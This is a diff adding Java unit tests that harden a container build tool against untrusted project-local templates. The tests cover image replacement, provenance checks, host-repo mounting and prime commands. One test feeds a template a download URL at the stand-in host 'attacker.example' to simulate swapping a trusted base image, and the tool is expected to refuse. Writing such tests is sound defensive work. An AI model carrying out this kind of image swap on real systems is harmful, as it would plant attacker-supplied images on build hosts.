@@ -2331,4 +2331,227 @@ class BuildCommandTest {
         def.setProjectRoot(null);
         BuildCommand.requireConfinedBaseImages(def, defs);
     }
+
+    // --- #765: project-local templates must not reach host state through images or repos ---
+
+    private static ImageDef projectLocal(String name, Path root) {
+        var def = new ImageDef();
+        def.setName(name);
+        def.setSource(root.resolve(".incus-spawn/images/x.yaml").toString());
+        def.setProjectRoot(root);
+        return def;
+    }
+
+    private static ImageDef trusted(String name) {
+        var def = new ImageDef();
+        def.setName(name);
+        return def;
+    }
+
+    @Test
+    void projectLocalTemplateCannotReplaceAnImageItDidNotImport() {
+        var incus = mock(IncusClient.class);
+        when(incus.imageAliasTargetOrThrow("fedora-44-base")).thenReturn("abc");
+        when(incus.getImageProperty("abc", "incus-spawn.tag")).thenReturn("fedora-44-20260915");
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+
+        var e = assertThrows(IllegalStateException.class, () -> cmd.downloadAndAliasImage("fedora-44-base",
+                "https://attacker.example/evil.tar.xz", null, "fedora-44-20260915",
+                projectLocal("tpl-evil", Path.of("/work/repo"))));
+        assertTrue(e.getMessage().contains("may only replace images it imported itself"), e.getMessage());
+        verify(incus, never()).deleteImage(any());
+        verify(incus, never()).deleteImageAlias(any());
+        verify(cmd, never()).newDownloadCache();
+    }
+
+    @Test
+    void projectLocalTemplateReusesItsOwnImport() {
+        var incus = mock(IncusClient.class);
+        when(incus.imageAliasTargetOrThrow("proj-base")).thenReturn("abc");
+        when(incus.getImageProperty("abc", "incus-spawn.tag")).thenReturn("v1");
+        when(incus.imagePropertyOrThrow("abc", BuildCommand.IMAGE_PROJECT_PROPERTY)).thenReturn("/work/repo");
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+
+        cmd.downloadAndAliasImage("proj-base", "https://example.com/img.tar.xz", null, "v1",
+                projectLocal("tpl-proj", Path.of("/work/repo")));
+        verify(incus, never()).deleteImage(any());
+        verify(cmd, never()).newDownloadCache();
+    }
+
+    @Test
+    void trustedTemplateReplacesAProjectImportEvenWithMatchingTag(@TempDir Path tmp) throws Exception {
+        var incus = mock(IncusClient.class);
+        when(incus.imageAliasTargetOrThrow("fedora-44-base")).thenReturn("evil");
+        when(incus.getImageProperty("evil", "incus-spawn.tag")).thenReturn("fedora-44-20260915");
+        when(incus.imagePropertyOrThrow("evil", BuildCommand.IMAGE_PROJECT_PROPERTY)).thenReturn("/work/repo");
+        var tarball = Files.writeString(tmp.resolve("genuine.tar.xz"), "genuine");
+        when(incus.importImage(tarball)).thenReturn("genuine");
+        when(incus.imagePropertyOrThrow("genuine", BuildCommand.IMAGE_PROJECT_PROPERTY)).thenReturn("");
+        var cache = mock(dev.incusspawn.tool.DownloadCache.class);
+        when(cache.downloadAllowingLocalFile(anyString(), any())).thenReturn(tarball);
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+        doReturn(cache).when(cmd).newDownloadCache();
+
+        cmd.downloadAndAliasImage("fedora-44-base", "https://example.com/fedora.tar.xz", null,
+                "fedora-44-20260915", trusted("tpl-minimal"));
+
+        verify(incus).deleteImage("evil");
+        // The stamp overwrites whatever the tarball shipped, before the alias makes it usable.
+        var order = inOrder(incus);
+        order.verify(incus).setImageProperty("genuine", BuildCommand.IMAGE_PROJECT_PROPERTY, "");
+        order.verify(incus).createImageAlias("fedora-44-base", "genuine");
+    }
+
+    @Test
+    void importWhoseOwnershipStampDidNotStickIsDeleted(@TempDir Path tmp) throws Exception {
+        var incus = mock(IncusClient.class);
+        var tarball = Files.writeString(tmp.resolve("img.tar.xz"), "img");
+        when(incus.importImage(tarball)).thenReturn("fp");
+        // setImageProperty fails silently; the read-back shows no stamp.
+        when(incus.imagePropertyOrThrow("fp", BuildCommand.IMAGE_PROJECT_PROPERTY)).thenReturn(null);
+        var cache = mock(dev.incusspawn.tool.DownloadCache.class);
+        when(cache.downloadAllowingLocalFile(anyString(), any())).thenReturn(tarball);
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+        doReturn(cache).when(cmd).newDownloadCache();
+
+        assertThrows(IllegalStateException.class, () -> cmd.downloadAndAliasImage("proj-base",
+                "https://example.com/img.tar.xz", null, "v1", projectLocal("tpl-proj", Path.of("/work/repo"))));
+        verify(incus).deleteImage("fp");
+        verify(incus, never()).createImageAlias(any(), any());
+    }
+
+    @Test
+    void buildsOnlyStartFromTrustedOrOwnProjectImages() {
+        var incus = mock(IncusClient.class);
+        when(incus.imageAliasTargetOrThrow("fedora-44-base")).thenReturn("abc");
+        when(incus.imagePropertyOrThrow("abc", BuildCommand.IMAGE_PROJECT_PROPERTY)).thenReturn("/work/repo");
+        when(incus.imageAliasTargetOrThrow("legacy")).thenReturn("old");
+        var cmd = new BuildCommand();
+        cmd.incus = incus;
+
+        assertThrows(IllegalStateException.class,
+                () -> cmd.requireImageTrustedFor("fedora-44-base", trusted("tpl-mine")));
+        assertThrows(IllegalStateException.class,
+                () -> cmd.requireImageTrustedFor("fedora-44-base", projectLocal("tpl-other", Path.of("/elsewhere"))));
+        cmd.requireImageTrustedFor("fedora-44-base", projectLocal("tpl-proj", Path.of("/work/repo")));
+        cmd.requireImageTrustedFor("legacy", trusted("tpl-mine")); // imported before the stamp existed
+        cmd.requireImageTrustedFor("images:fedora/44", trusted("tpl-mine"));
+    }
+
+    @Test
+    void imageProvenanceLookupsFailClosed() {
+        var incus = mock(IncusClient.class);
+        when(incus.imageAliasTargetOrThrow("fedora-44-base")).thenReturn("abc");
+        when(incus.imagePropertyOrThrow("abc", BuildCommand.IMAGE_PROJECT_PROPERTY))
+                .thenThrow(new IncusException("HTTP 500"));
+        when(incus.imageAliasTargetOrThrow("flaky")).thenThrow(new IncusException("HTTP 503"));
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+
+        // A failed read is not "imported by a trusted definition"...
+        assertThrows(IncusException.class, () -> cmd.requireImageTrustedFor("fedora-44-base", trusted("tpl-mine")));
+        assertThrows(IncusException.class, () -> cmd.downloadAndAliasImage("fedora-44-base",
+                "https://example.com/x.tar.xz", null, "v1", projectLocal("tpl-proj", Path.of("/work/repo"))));
+        // ...and a failed alias lookup is not "no such alias".
+        assertThrows(IncusException.class, () -> cmd.requireImageTrustedFor("flaky", trusted("tpl-mine")));
+        verify(incus, never()).deleteImage(any());
+        verify(cmd, never()).newDownloadCache();
+    }
+
+    @Test
+    void projectLocalTemplatesNeverMountHostCheckouts() {
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        when(incus.execInContainer(eq("test"), anyString(), anyString())).thenReturn(OK);
+        var repo = new ImageDef.RepoEntry();
+        repo.setUrl("https://github.com/owner/repo.git");
+        repo.setPath("~/repo");
+        var imageDef = projectLocal("tpl-proj", Path.of("/work/repo"));
+        imageDef.setRepos(List.of(repo));
+
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+        cmd.cloneRepos(container, imageDef, false);
+
+        verify(cmd, never()).tryMountReference(any(), any(), any(), anyBoolean());
+        verify(incus, never()).deviceAdd(any(), any(), any(), any(String[].class));
+        verify(incus).execInContainer("test", "agentuser",
+                "git clone --single-branch -- 'https://github.com/owner/repo.git' '/home/agentuser/repo'");
+    }
+
+    @Test
+    void noPrimeRunsWhileAHostReferenceIsMounted() {
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        var mounted = new java.util.concurrent.atomic.AtomicInteger();
+        var primesWhileMounted = new java.util.concurrent.atomic.AtomicInteger();
+        var primes = new java.util.concurrent.atomic.AtomicInteger();
+        when(incus.execInContainer(eq("test"), anyString(), anyString())).thenAnswer(inv -> {
+            String cmdLine = inv.getArgument(2);
+            if (cmdLine.contains("echo primed")) {
+                primes.incrementAndGet();
+                if (mounted.get() > 0) primesWhileMounted.incrementAndGet();
+            }
+            if (cmdLine.startsWith("git clone --no-hardlinks")) Thread.sleep(50); // slow local clones
+            return OK;
+        });
+        doAnswer(inv -> { mounted.decrementAndGet(); return null; }).when(incus).deviceRemove(eq("test"), anyString());
+
+        // More referenced repos than any worker limit, each with a prime: the waiting primes must
+        // not starve the clones that detach the references.
+        var repos = new java.util.ArrayList<ImageDef.RepoEntry>();
+        for (int i = 0; i < 12; i++) {
+            var repo = new ImageDef.RepoEntry();
+            repo.setUrl("https://github.com/owner/repo" + i + ".git");
+            repo.setPath("~/repo" + i);
+            repo.setPrime("echo primed");
+            repos.add(repo);
+        }
+        var imageDef = trusted("tpl-test");
+        imageDef.setRepos(repos);
+
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+        doReturn(1).when(cmd).repoConcurrency(anyInt()); // one slot: 6 references > 1 worker
+        for (int i = 0; i < 12; i++) {
+            if (i % 2 == 1) continue; // half via host reference, half from the network
+            var url = repos.get(i).getUrl();
+            doAnswer(inv -> {
+                mounted.incrementAndGet();
+                return new BuildCommand.RepoReference("ref-" + url.hashCode(), "/mnt/ref/" + url.hashCode(), null);
+            }).when(cmd).tryMountReference(eq(container), eq(url), any(), eq(false));
+        }
+
+        assertTimeoutPreemptively(java.time.Duration.ofSeconds(30),
+                () -> cmd.cloneRepos(container, imageDef, false));
+        assertEquals(12, primes.get());
+        assertEquals(0, primesWhileMounted.get());
+        assertEquals(0, mounted.get());
+    }
+
+    @Test
+    void failedDetachFailsTheBuildInsteadOfPriming() {
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        when(incus.execInContainer(eq("test"), anyString(), anyString())).thenReturn(OK);
+        doThrow(new IncusException("busy")).when(incus).deviceRemove(eq("test"), anyString());
+        var repo = new ImageDef.RepoEntry();
+        repo.setUrl("https://github.com/owner/repo.git");
+        repo.setPath("~/repo");
+        repo.setPrime("echo primed");
+        var imageDef = trusted("tpl-test");
+        imageDef.setRepos(List.of(repo));
+
+        var cmd = spy(new BuildCommand());
+        cmd.incus = incus;
+        doReturn(new BuildCommand.RepoReference("ref-repo", "/mnt/ref/repo", null))
+                .when(cmd).tryMountReference(eq(container), eq(repo.getUrl()), any(), eq(false));
+
+        assertThrows(RuntimeException.class, () -> cmd.cloneRepos(container, imageDef, false));
+        verify(incus, never()).execInContainer(eq("test"), eq("agentuser"), contains("echo primed"));
+    }
 }
